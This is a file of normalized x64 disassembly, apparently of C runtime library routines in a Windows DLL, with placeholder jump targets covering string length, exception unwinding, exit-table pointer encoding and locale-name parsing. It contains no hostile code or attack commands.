call sub_180018b3c
mov eax ebx
jmp r-xdata
mov rcx [ rdi + 0x138 ]
sub rcx 0xfe
call sub_180018b3c
mov rcx [ rdi + 0x148 ]
add rcx 0xffffffffffffff80
call sub_180018b3c
mov rcx [ rdi + 0x150 ]
add rcx 0xffffffffffffff80
call sub_180018b3c
mov rcx [ rdi + 0x130 ]
call sub_180018b3c
movzx edx [ rcx - 0x1 ]
jmp r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
movsxd rax edx
mov r8d 0x8000
add edx esi
mov [ r13 + rax * 2 + 0x100 ] r8w
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
cmp [ rcx ] bl
je r-xdata
sub_180019994
sub rsp 0x28
call sub_18001e320
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov eax [ rcx + 0x10c ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18001e138
mov rcx rax
sub_1800199e4
sub rsp 0x28
call sub_18001e320
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov eax [ rcx + 0x4 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18001e138
mov rcx rax
sub_180019a1c
sub rsp 0x28
call sub_18001e320
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
lea rax [ rcx + 0xc ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18001e138
mov rcx rax
sub_180019a54
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov ecx 0x19
call sub_180020e50
mov edx 0x1
xor ecx ecx
call sub_18001d484
add rsp 0x28
jmp sub_18001d444
call rax
sub_180019aa0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_180019b48
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_180021180
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
dec edi
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_180019c9c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_180019b48
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_180021180
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
dec edi
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_18001bf0c
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_18001e320
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_180019d48
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_18001e320
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_18001e320
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_18001e320
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_18001cea8
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_180019dd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_18001e320
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_18001e320
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_18001cea8
call sub_18001e320
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_180019e74
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_18001e320
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_180019ec8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rdi rdx
mov rcx rdi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_180021180
mov esi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_180021248
test edx edx
je r-xdata
movsxd rcx [ rdi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp esi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp esi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rdi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
mov eax [ r8 ]
cmp eax r11d
cmove eax edx
mov [ r8 ] eax
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_180019ff4
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_18001e320
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_18001e320
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_18001e320
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001a038
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001e320
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_18001a06c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_18001e320
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_18001e320
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_180021248
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_180021248
call sub_18001e320
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18001a0cc
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b8 ]
sub rsp 0x5b8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov rbx [ rbp + 0x520 ]
mov rdi [ rbp + 0x530 ]
mov r14 [ rbp + 0x538 ]
mov r13 rdx
mov r15 rcx
mov r12 r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rsi r9
call sub_180018670
movsxd rax [ rbp + 0x528 ]
mov rdx [ r14 ]
mov rcx [ r15 ]
mov [ rsp + 0x68 ] rax
movzx eax [ rbp + 0x540 ]
lea r11 [ sub_18001c1f0 ]
lea r8 [ rsp + 0x30 ]
mov [ rbp - 0x78 ] rax
mov rax [ r14 + 0x40 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x78 ] rdi
mov [ rbp - 0x80 ] r13
mov [ rbp - 0x70 ] 0x19930520
call RtlUnwindEx
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_180018450
add rsp 0x5b8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_18001a1bc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov edi ecx
call sub_18001e29c
mov rbx rax
test rax rax
jne r-xdata
cmp [ rax + 0x38 ] 0x0
jne r-xdata
lea rax [ r--data ]
mov rbx [ rbx + 0x38 ]
test edi edi
js r-xdata
mov edx 0x1
mov ecx 0x86
call sub_18001b79c
mov [ rbx + 0x38 ] rax
test rax rax
je r-xdata
call sub_180021290
mov edi [ rax ]
call sub_180021290
cmp edi [ rax ]
jl r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov rax rbx
jmp r-xdata
call sub_180021298
movsxd rcx edi
mov edx 0x86
mov r8 [ rax + rcx * 8 ]
mov rcx rbx
call sub_18001d5ec
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_18001a258
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_18001b79c
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001a29c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_18001fbd4
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_180021360
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_18001fbe0
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_18001b820
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_18001b820
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_18001a3c0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0xd
call sub_180022e38
nop
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov ecx 0xd
call sub_180022d38
cmp [ rbx ] 0x0
je r-xdata
[ rcx ]
jne r-xdata
mov eax 0xbaadf00d
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov rcx rbx
call sub_180018b3c
add rsp 0x20
pop rbx
mov ecx 0xc
call sub_180022e38
nop
mov rcx [ rbx ]
call sub_18001dec0
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
mov ecx 0xc
call sub_180022d38
cmp [ rcx ] 0x0
jne r-xdata
call sub_180018b3c
nop
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
call sub_18001df64
nop
sub_18001a468
test r8d r8d
jle r-xdata
retn
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x20 ] r9
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
lea rdi [ rsp + 0x78 ]
xor ebx ebx
mov rsi rdx
add rdi 0xfffffffffffffff8
mov rbp rcx
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
inc ebx
cmp ebx [ rsp + 0x70 ]
jl r-xdata
add rdi 0x8
mov rdx rsi
mov rcx rbp
mov r8 [ rdi ]
call sub_180022e7c
test eax eax
jne r-xdata
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
sub_18001a4d0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbx rdx
mov r8d 0x90
xor edx edx
mov rsi rcx
call sub_18001d7d0
cmp [ rbx ] 0x0
jne r-xdata
cmp [ rbx ] 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
xor ebp ebp
lea r8 [ rbx + 0x1 ]
cmp [ r8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
or eax 0xffffffff
lea r12 [ rax + rbx ]
mov dil [ r12 ]
test ebp ebp
jne r-xdata
mov edx 0x10
lea rcx [ rsi + 0x80 ]
lea r9d [ rdx - 0x1 ]
call sub_1800212a0
test eax eax
jne r-xdata
cmp ebp 0x1
jne r-xdata
cmp rax 0x40
jae r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov [ rsi + 0x8f ] al
jmp r-xdata
cmp ebp 0x2
jne r-xdata
cmp rax 0x40
jae r-xdata
cmp dil 0x2e
je r-xdata
cmp rax 0x10
jae r-xdata
cmp dil 0x5f
je r-xdata
lea edx [ rbp + 0x40 ]
mov r9 rax
mov r8 rbx
mov rcx rsi
call sub_1800212a0
test eax eax
je r-xdata
test dil dil
je r-xdata
lea rcx [ rsi + 0x40 ]
lea edx [ rbp + 0x3f ]
mov r9 rax
mov r8 rbx
call sub_1800212a0
test eax eax
je r-xdata
cmp dil 0x2c
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
lea rcx [ rsi + 0x80 ]
mov r9 rax
mov r8 rbx
mov edx 0x10
call sub_1800212a0
test eax eax
jne r-xdata
cmp dil 0x2c
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
test dil dil
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
lea rbx [ r12 + 0x1 ]
inc ebp
jmp r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_180018c48
test rax rax
je r-xdata
sub_18001a680
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
mov rsi rcx
call sub_18001d5ec
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
lea rax [ rbx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
lea rax [ rbx + 0x80 ]
cmp [ rax ] 0x0
je r-xdata
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_18001a468
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_18001a468
sub_18001a718
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rdi rcx
mov ecx 0x355
mov r12d 0x1
call sub_18001b71c
xor r15d r15d
mov rsi rax
test rax rax
jne r-xdata
lea rbp [ rax + 0x4 ]
mov ebx 0x351
mov r8d 0x3
mov [ rbp ] r15b
mov [ rax ] r12d
mov rax [ rdi + 0x68 ]
mov r9 [ r--data ]
mov [ rsp + 0x28 ] rax
lea rax [ r--data ]
mov edx ebx
mov rcx rbp
mov [ rsp + 0x20 ] rax
call sub_18001a468
lea r13 [ r--data ]
lea r14 [ rdi + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
call sub_18001da10
int3
mov rcx [ r14 ]
lea rbx [ r14 + 0x20 ]
mov rdx [ rbx ]
call sub_18001d6d0
mov r14 rbx
mov r8d 0x3
test eax eax
mov rax [ rbx ]
mov ebx 0x351
mov [ rsp + 0x28 ] rax
cmovne r12d r15d
lea rax [ r--data ]
add r13 0x18
mov edx ebx
mov rcx rbp
mov r9 [ r13 ]
mov [ rsp + 0x20 ] rax
call sub_18001a468
lea r11 [ r--data ]
cmp r13 r11
jl r-xdata
lea r8 [ r--data ]
mov rdx rbx
mov rcx rbp
call sub_180022e7c
test eax eax
jne r-xdata
test r12d r12d
jne r-xdata
mov rcx rsi
call sub_180018b3c
mov rcx [ rdi + 0x58 ]
or ebx 0xffffffff
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x58 ]
or ebx 0xffffffff
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x60 ]
test rcx rcx
je r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rax [ rdi + 0x60 ]
test rax rax
je r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rax [ rdi + 0x88 ]
mov [ rdi + 0x60 ] r15
mov [ rdi + 0x50 ] r15
mov [ rdi + 0x58 ] r15
mov [ rdi + 0x48 ] r15
jmp r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rcx [ rdi + 0x58 ]
call sub_180018b3c
mov [ rdi + 0x60 ] r15
mov [ rdi + 0x50 ] r15
mov [ rdi + 0x58 ] rsi
mov [ rdi + 0x48 ] rbp
mov rax rbp
jmp r-xdata
mov ecx ebx
[ rax ] ecx
add ecx ebx
jne r-xdata
mov rcx [ rdi + 0x58 ]
call sub_180018b3c
mov rcx [ rdi + 0x60 ]
call sub_180018b3c
mov rcx [ rdi + 0x60 ]
call sub_180018b3c
sub_18001a8f4
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rsi [ rsp + 0x160 ]
mov rbx r9
mov r14 r8
mov rbp rdx
mov rdi rcx
call sub_18001e320
lea rcx [ rax + 0x170 ]
lea r15 [ rax + 0x168 ]
xor r12d r12d
mov [ rsp + 0x40 ] rcx
lea rcx [ rax + 0x174 ]
lea r13 [ rax + 0x1f7 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x38 ] rcx
test rdi rdi
je r-xdata
xor eax eax
test rbp rbp
je r-xdata
test r14 r14
je r-xdata
cmp [ rdi ] 0x43
jne r-xdata
mov rcx rdi
call sub_180019aa0
mov r12 rax
cmp rax 0x83
jae r-xdata
cmp [ rdi + 0x1 ] r12b
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov rdx rdi
xor r15d r15d
call sub_18001a4d0
test eax eax
jne r-xdata
mov rdx rdi
mov rcx r13
call sub_18001d6d0
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r14
mov rcx rbp
call sub_18001d5ec
test eax eax
jne r-xdata
mov rdx [ rsp + 0x30 ]
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x50 ]
call sub_180023648
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x38 ]
mov rdx rdi
call sub_18001d6d0
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_18001da10
int3
test rbx rbx
je r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x40 ]
lea r8 [ rsp + 0x50 ]
movzx eax [ rax + 0x4 ]
mov edx 0x83
mov [ rcx ] eax
mov rcx r13
call sub_18001a680
cmp [ rdi ] r15b
je r-xdata
test rsi rsi
je r-xdata
mov r8d 0x6
mov rdx r15
mov rcx rbx
call sub_180018670
test rsi rsi
je r-xdata
mov [ rbx ] r12d
mov [ rbx + 0x4 ] r12w
lea rdi [ r--data ]
cmp r12 0x83
jae r-xdata
mov r8 r13
mov rdx r14
mov rcx rbp
call sub_18001d5ec
test eax eax
jne r-xdata
mov rdx [ rsp + 0x40 ]
mov r8d 0x4
mov rcx rsi
call sub_180018670
mov rax rbp
jmp r-xdata
mov [ rsi ] r12d
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov r15 [ rsp + 0x30 ]
mov r15 r12
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov rax r13
jmp r-xdata
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_180018450
add rsp 0xf8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rsp + 0x38 ]
lea r9 [ r15 + 0x1 ]
mov r8 rdi
mov edx 0x83
call sub_1800212a0
test eax eax
jne r-xdata
sub_18001ab30
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x110 ]
sub rsp 0x210
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x100 ] rax
mov rbx r8
movsxd r12 edx
mov rdi rcx
call sub_18001e320
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x70 ]
mov rsi rax
lea rax [ rsp + 0x44 ]
mov r8d 0x83
mov rcx rbx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rax
call sub_18001a8f4
test rax rax
jne r-xdata
mov rbx r12
lea rcx [ rsp + 0x70 ]
mov r15 r12
shl rbx 0x5
mov rdx [ rbx + rdi + 0x48 ]
call sub_18001d6d0
test eax eax
jne r-xdata
xor eax eax
lea rcx [ rsp + 0x70 ]
call sub_180019aa0
mov r12 rax
lea rcx [ rax + 0x5 ]
call sub_18001b71c
mov r13 rax
test rax rax
je r-xdata
mov rax [ rbx + rdi + 0x48 ]
jmp r-xdata
mov rax [ rbx + rdi + 0x48 ]
lea r14 [ r15 + 0x3 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x58 ] rax
mov eax [ rdi + r14 * 4 ]
mov r8d 0x6
mov [ rsp + 0x54 ] eax
lea rax [ r15 + r15 * 2 + 0x12 ]
lea rax [ rdi + rax * 2 ]
mov rdx rax
mov [ rsp + 0x60 ] rax
call sub_180018670
mov eax [ rdi + 0x4 ]
lea rdx [ r12 + 0x1 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ r13 + 0x4 ]
mov [ rsp + 0x50 ] eax
call sub_18001d5ec
test eax eax
jne r-xdata
mov rcx [ rbp + 0x100 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x268 ]
add rsp 0x210
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov rcx [ rsp + 0x60 ]
lea rax [ r13 + 0x4 ]
lea rdx [ rsp + 0x48 ]
mov [ rbx + rdi + 0x48 ] rax
movzx eax [ rsp + 0x48 ]
mov r8d 0x6
mov [ rdi + r14 * 4 ] eax
call sub_180018670
mov r9d r15d
cmp r15d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov eax [ rsp + 0x44 ]
xor r8d r8d
xor edx edx
mov [ rdi + 0x4 ] eax
mov rcx [ rsi + 0x29c ]
lea rax [ r15 + r15 * 2 ]
lea rdx [ r--data ]
mov rcx rdi
call [ rdx + rax * 8 ]
test eax eax
je r-xdata
mov eax [ rsp + 0x44 ]
mov [ rdi + 0x8 ] eax
test r8d r8d
